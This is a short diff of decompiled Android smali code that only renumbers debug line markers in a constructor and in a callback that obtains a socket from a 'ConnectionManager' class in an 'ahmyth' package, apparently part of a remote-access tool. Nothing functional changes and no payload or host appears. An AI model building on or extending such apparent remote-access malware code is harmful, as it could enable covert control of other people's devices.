@@ -21,7 +21,7 @@
 .method constructor <init>()V
     .locals 0
 
-    .line 76
+    .line 74
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
     return-void
@@ -32,7 +32,7 @@
 .method public varargs call([Ljava/lang/Object;)V
     .locals 2
 
-    .line 79
+    .line 77
     invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->access$000()Lio/socket/client/Socket;
 
     move-result-object p1
